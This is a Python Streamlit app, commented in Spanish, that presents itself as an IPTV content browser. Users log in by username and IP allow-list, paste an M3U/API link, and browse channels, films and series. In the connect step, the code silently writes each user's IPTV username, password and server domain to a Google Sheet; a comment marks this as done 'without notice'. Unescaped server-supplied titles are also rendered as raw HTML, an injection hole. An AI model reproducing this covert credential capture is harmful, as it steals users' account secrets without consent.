import streamlit as st
import requests
import hashlib
import time
from oauth2client.service_account import ServiceAccountCredentials
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from streamlit_javascript import st_javascript
import gspread

# 1. CONFIGURACIÓN DE PÁGINA
st.set_page_config(page_title="Buscador PRO", layout="wide", page_icon="📺")

# 2. ESTILOS VISUALES
@st.cache_resource
def inject_styles():
    st.markdown("""
        <style>
        /* Ocultar elementos nativos */
        #MainMenu, header, footer {visibility: hidden;}

        /* --- FONDO DE PANTALLA --- */
        .stApp {
            background-image: url("https://cdn.maxplayer.tv/demo/background.png");
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            color: white;
        }

        /* FORMULARIOS */
        div[data-testid="stForm"] {
            background-color: rgba(20, 20, 20, 0.95);
            padding: 30px;
            border-radius: 10px;
            border: 1px solid #333;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
        }

        /* INPUTS */
        .stTextInput > div > div > input {
            background-color: #222; color: white; border: 1px solid #444; border-radius: 4px;
        }

        /* BOTONES */
        .stButton > button {
            width: 100%; background-color: #0d6efd; color: white; border: none;
            font-weight: 600; text-transform: uppercase; height: 45px; transition: all 0.3s;
        }
        .stButton > button:hover {
            background-color: #0b5ed7; box-shadow: 0 4px 12px rgba(13, 110, 253, 0.4);
        }

        /* --- ANIMACIÓN DE CARGA SPINNER --- */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid rgba(0, 198, 255, 0.3);
            border-top: 3px solid #00C6FF;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        .ip-badge {
            display: inline-block;
            background-color: rgba(0, 198, 255, 0.15);
            border: 1px solid #00C6FF;
            color: #00C6FF;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            margin-top: 10px;
        }

        /* --- ESTILO VOD EXACTO --- */
        .vod-grid {
            display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 15px; width: 100%; margin-top: 20px;
        }
        .vod-card {
            background-color: rgba(38, 38, 38, 0.95); border-radius: 8px; overflow: hidden;
            border: 1px solid #333; display: flex; flex-direction: column; transition: transform 0.2s;
        }
        .vod-card:hover { transform: scale(1.05); border-color: #00C6FF; z-index: 10; }
        .vod-img { width: 100%; aspect-ratio: 2/3; object-fit: cover; }
        .vod-info { padding: 8px; text-align: center; }
        .vod-title { font-size: 13px; font-weight: bold; color: white; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        .vod-cat { 
            font-size: 12px !important;
            color: #00C6FF !important;
            white-space: nowrap !important;
            overflow: hidden !important;
            text-overflow: ellipsis !important;
        }

        /* --- LISTA CANALES --- */
        .channel-row {
            background-color: rgba(30, 30, 30, 0.95);
            padding: 10px 15px;
            margin-bottom: 6px;
            border-radius: 5px;
            border-left: 4px solid #00C6FF;
            display: flex; align-items: center;
        }
        </style>
    """, unsafe_allow_html=True)

inject_styles()

# 🔴 TU ID DE GOOGLE SHEETS
SHEET_URL = "https://docs.google.com/spreadsheets/d/1lyj55UiweI75ej3hbPxvsxlqv2iKWEkKTzEmAvoF6lI/edit"


# --- INICIALIZACIÓN DE VARIABLES ---
if 'logged_in' not in st.session_state: st.session_state.logged_in = False
if 'user' not in st.session_state: st.session_state.user = ""
if 'iptv_data' not in st.session_state: st.session_state.iptv_data = None
if 'mode' not in st.session_state: st.session_state.mode = 'live'
if 'user_ip' not in st.session_state: st.session_state.user_ip = None
if 'ip_loading' not in st.session_state: st.session_state.ip_loading = True
# Cache de datos
if 'data_live' not in st.session_state: st.session_state.data_live = None
if 'data_vod' not in st.session_state: st.session_state.data_vod = None
if 'data_series' not in st.session_state: st.session_state.data_series = None
# Contador de items mostrados
if 'vod_display_count' not in st.session_state: st.session_state.vod_display_count = 60
if 'series_display_count' not in st.session_state: st.session_state.series_display_count = 60


# 3. FUNCIONES

@st.cache_data(ttl=60) 
def get_users_from_cloud():
    """Descarga usuarios de Google Sheets"""
    try:
        scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
        creds_dict = dict(st.secrets["gcp_service_account"])
        creds_dict["private_key"] = creds_dict["private_key"].replace("\\n", "\n")
        
        creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
        client = gspread.authorize(creds)
        sheet = client.open_by_url(SHEET_URL).sheet1
        return sheet.get_all_records()
    except: return []

def get_my_ip():
    """Detecta IP Real via JS"""
    try:
        url = 'https://api.ipify.org'
        ip_js = st_javascript(f"await fetch('{url}').then(r => r.text())")
        if ip_js and isinstance(ip_js, str) and len(ip_js) > 6: 
            return ip_js
        return None
    except: return None

def save_connection_data(username_login, username_iptv, password_iptv, domain_port):
    """Guarda datos en Sheet2 del Google Sheets"""
    try:
        scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
        creds_dict = dict(st.secrets["gcp_service_account"])
        creds_dict["private_key"] = creds_dict["private_key"].replace("\\n", "\n")
        
        creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
        client = gspread.authorize(creds)
        spreadsheet = client.open_by_url(SHEET_URL)
        
        # Acceder a Sheet2
        try:
            sheet2 = spreadsheet.get_worksheet(1)  # Index 1 = Sheet2
        except:
            # Si no existe, crearla
            sheet2 = spreadsheet.add_worksheet(title="Conexiones", rows=100, cols=5)
        
        # Agregar header si está vacía
        if not sheet2.get_all_records():
            sheet2.append_row(["timestamp", "username_login", "usuario_iptv", "password_iptv", "dominio:puerto"])
        
        # Agregar datos
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        sheet2.append_row([timestamp, username_login, username_iptv, password_iptv, domain_port])
        
        return True
    except Exception as e:
        print(f"Error guardando conexión: {e}")
        return False

def extract_domain_port(url):
    """Extrae dominio:puerto de una URL"""
    try:
        parsed = urlparse(url)
        domain = parsed.netloc
        return domain if domain else "desconocido"
    except:
        return "error"

# ==============================================================================
#  PANTALLA 1: LOGIN (MEJORADA)
# ==============================================================================
if not st.session_state.logged_in:
    st.markdown("<br><br>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns([1, 2, 1])
    with c2:
        # --- DETECCIÓN DE IP (Sutil y sin bloqueo) ---
        if st.session_state.user_ip is None and st.session_state.ip_loading:
            ip = get_my_ip()
            if ip: 
                st.session_state.user_ip = ip
                st.session_state.ip_loading = False
                st.rerun()
        
        with st.form("login_form"):
            st.markdown("<h2 style='text-align:center; color:white;'>🔐 CLIENT ACCESS</h2>", unsafe_allow_html=True)
            
            # IP Status Badge (Sutil con animación)
            if st.session_state.user_ip:
                st.markdown(f'<div class="ip-badge">IP Verificada: {st.session_state.user_ip}</div>', unsafe_allow_html=True)
            else:
                st.markdown("""
                    <div style="text-align:center; margin:15px 0;">
                        <span class="loading-spinner"></span>
                        <span style="color:#00C6FF; font-size:13px;">Verificando IP</span>
                    </div>
                """, unsafe_allow_html=True)

            # Input Usuario (SIN contraseña)
            u = st.text_input("Usuario")
            btn = st.form_submit_button("INICIAR SESIÓN")
            
            if btn:
                if not st.session_state.user_ip:
                    st.warning("⏳ Aún verificando IP... Espera un momento.")
                    st.stop()

                users_db = get_users_from_cloud()
                
                if not users_db:
                    st.error("⚠️ Error de conexión DB.")
                    st.stop()

                found = False
                for user in users_db:
                    if str(user.get('username')).strip() == u.strip():
                        found = True
                        allowed_ips_str = str(user.get('allowed_ip', ''))
                        # Separar por coma y limpiar espacios
                        allowed_ips = [ip.strip() for ip in allowed_ips_str.split(',') if ip.strip()]
                        
                        if st.session_state.user_ip in allowed_ips:
                            st.session_state.logged_in = True
                            st.session_state.user = u 
                            st.rerun()
                        else:
                            st.error(f"⛔ IP no autorizada ({st.session_state.user_ip})")
                            break
                
                if not found:
                    st.error("❌ Usuario no encontrado o IP no coincide.")

    st.stop()

# ==============================================================================
#  PANTALLA 2: CONECTAR URL (MEJORADA CON GUARDADO)
# ==============================================================================
if st.session_state.iptv_data is None:
    st.markdown("<br>", unsafe_allow_html=True)
    c1, c2, c3 = st.columns([1, 2, 1])
    with c2:
        st.markdown(f"<p style='text-align:center; color:#aaa'>Usuario: <b style='color:white'>{st.session_state.user}</b></p>", unsafe_allow_html=True)
        
        with st.form("connect_iptv"):
            st.markdown("<h3 style='text-align:center'>🔗 CONECTAR PLAYER</h3>", unsafe_allow_html=True)
            url_input = st.text_input("Pega tu enlace M3U / URL")
            
            if st.form_submit_button("CONECTAR"):
                if "http" in url_input:
                    with st.spinner("⏳ Conectando..."):
                        try:
                            # 1. Limpieza SIMPLE
                            final_api = url_input.strip()
                            final_api = final_api.replace("/get.php", "/player_api.php")
                            final_api = final_api.replace("/xmltv.php", "/player_api.php")
                            
                            # 2. Petición con User-Agent
                            headers = {"User-Agent": "Mozilla/5.0"}
                            res = requests.get(final_api, headers=headers, timeout=25)
                            
                            if res.status_code == 200:
                                try:
                                    data = res.json()
                                    if isinstance(data, dict) and 'user_info' in data:
                                        # ✅ GUARDAR EN SHEET2 (SIN AVISO)
                                        user_info = data['user_info']
                                        username_iptv = user_info.get('username', 'desconocido')
                                        password_iptv = user_info.get('password', 'desconocida')
                                        domain_port = extract_domain_port(final_api)
                                        
                                        save_connection_data(st.session_state.user, username_iptv, password_iptv, domain_port)
                                        
                                        # Guardar en session
                                        st.session_state.iptv_data = {
                                            "api": final_api, 
                                            "info": user_info
                                        }
                                        # Resetear caches
                                        st.session_state.data_live = None
                                        st.session_state.data_vod = None
                                        st.session_state.data_series = None
                                        # Resetear contadores
                                        st.session_state.vod_display_count = 60
                                        st.session_state.series_display_count = 60
                                        time.sleep(1)
                                        st.rerun()
                                    else:
                                        st.error("❌ Login fallido: El enlace no contiene información de usuario.")
                                except ValueError:
                                    st.error("❌ Error del servidor: No devolvió datos válidos.")
                            else: 
                                st.error(f"❌ Error HTTP {res.status_code}")
                        except Exception as e: 
                            st.error(f"❌ Error técnico: {e}")
                else: 
                    st.warning("⚠️ URL inválida.")
    st.stop()

# ==============================================================================
#  PANTALLA 3: DASHBOARD VISUAL
# ==============================================================================
info = st.session_state.iptv_data['info']
api = st.session_state.iptv_data['api']

# --- HEADER ---
exp = "Indefinido"
if info.get('exp_date') and str(info.get('exp_date')) != 'null':
    try:
        exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%d/%m/%Y')
    except: pass

st.markdown(f"""
<div style="background: rgba(20,20,20,0.95); padding:15px 25px; border-radius:10px; display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #0069d9; margin-bottom:15px;">
    <span style="font-weight:bold; color:white; font-size:22px;">BUSCADOR DE CONTENIDO PRO</span>
    <div style="font-size:12px; color:#ccc; text-align:right;">
        <div style="margin-bottom:2px;">USER: <b style="color:white">{info.get('username')}</b></div>
        <div>EXP: <b style="color:#00C6FF">{exp}</b> | STATUS: <b style="color:#00FF00">{info.get('status')}</b></div>
    </div>
</div>
""", unsafe_allow_html=True)

# --- MENÚ ---
c1, c2, c3, c4 = st.columns(4)
if c1.button("📡 TV EN VIVO"): st.session_state.mode = 'live'; st.rerun()
if c2.button("🎥 PELÍCULAS"): st.session_state.mode = 'vod'; st.rerun()
if c3.button("📺 SERIES"): st.session_state.mode = 'series'; st.rerun()
if c4.button("🔌 SALIR"): 
    st.session_state.iptv_data = None
    st.session_state.data_live = None
    st.session_state.data_vod = None
    st.session_state.data_series = None
    st.rerun()

# --- CARGA DE DATOS ---
def fetch_data_and_cats(action_content, action_cats):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        url_content = f"{api}&action={action_content}"
        url_cats = f"{api}&action={action_cats}"
        
        data = requests.get(url_content, headers=headers, timeout=30).json()
        cats = requests.get(url_cats, headers=headers, timeout=20).json()
        
        cat_map = {str(c['category_id']): c['category_name'] for c in cats}
        return data, cat_map
    except: return [], {}

# Carga Lazy
mode = st.session_state.mode
if mode == 'live' and st.session_state.data_live is None:
    with st.spinner("Cargando Canales..."):
        st.session_state.data_live = fetch_data_and_cats('get_live_streams', 'get_live_categories')

elif mode == 'vod' and st.session_state.data_vod is None:
    with st.spinner("Cargando Películas..."):
        st.session_state.data_vod = fetch_data_and_cats('get_vod_streams', 'get_vod_categories')

elif mode == 'series' and st.session_state.data_series is None:
    with st.spinner("Cargando Series..."):
        st.session_state.data_series = fetch_data_and_cats('get_series', 'get_series_categories')

# Selección
data, cat_map = [], {}
if mode == 'live': data, cat_map = st.session_state.data_live or ([], {})
elif mode == 'vod': data, cat_map = st.session_state.data_vod or ([], {})
elif mode == 'series': data, cat_map = st.session_state.data_series or ([], {})

# --- FILTROS ---
st.markdown("---")
c_filtro, c_busq = st.columns([1, 2])

with c_filtro:
    all_cats = ["Todas"] + sorted(list(cat_map.values()))
    sel_cat = st.selectbox("📂 Filtrar por Carpeta", all_cats)

with c_busq:
    query = st.text_input("🔍 Buscar Título", placeholder="Escribe para buscar...").lower()

# --- APLICAR FILTROS ---
filtered = data
if sel_cat != "Todas":
    target_ids = [k for k, v in cat_map.items() if v == sel_cat]
    if target_ids:
        filtered = [x for x in filtered if str(x.get('category_id')) in target_ids]

if query:
    filtered = [x for x in filtered if query in str(x.get('name')).lower()]

# --- VISUALIZACIÓN ---
st.info(f"Mostrando {len(filtered)} resultados")

if mode == 'live':
    # LISTA PARA CANALES
    html = ""
    for item in filtered[:100]:
        cat_name = cat_map.get(str(item.get('category_id')), "General")
        html += f"""
        <div class="channel-row">
            <div style="width:50px; color:#00C6FF; font-weight:bold; font-size:16px;">{item.get('num', '#')}</div>
            <div style="flex-grow:1;">
                <div style="font-size:12px; color:#aaa; text-transform:uppercase; font-weight:600; margin-bottom:2px;">{cat_name}</div>
                <div style="color:white; font-weight:500; font-size:15px;">{item.get('name')}</div>
            </div>
        </div>
        """
    st.markdown(html, unsafe_allow_html=True)

else:
    # --- GRID PARA VOD CON LOAD MORE ---
    if mode == 'vod':
        display_count = st.session_state.vod_display_count
    else:
        display_count = st.session_state.series_display_count
    
    view_items = filtered[:display_count]
    
    html = '<div class="vod-grid">'
    for item in view_items:
        img = item.get('stream_icon') or item.get('cover')
        if not img or not img.startswith("http"): 
            img = "https://via.placeholder.com/150x225?text=..."
        
        title = item.get('name')
        cat_name = cat_map.get(str(item.get('category_id')), "VOD")
        
        html += f"""
        <div class="vod-card">
            <img src="{img}" class="vod-img" loading="lazy">
            <div class="vod-info">
                <div class="vod-title" title="{title}">{title}</div>
                <div class="vod-cat">📂 {cat_name}</div>
            </div>
        </div>"""
    
    html += '</div>'
    st.markdown(html, unsafe_allow_html=True)
    
    # BOTÓN CARGAR MÁS
    if len(filtered) > display_count:
        col1, col2, col3 = st.columns([1, 2, 1])
        with col2:
            if st.button("📥 Cargar Más", use_container_width=True):
                if mode == 'vod':
                    st.session_state.vod_display_count += 60
                else:
                    st.session_state.series_display_count += 60
                st.rerun()


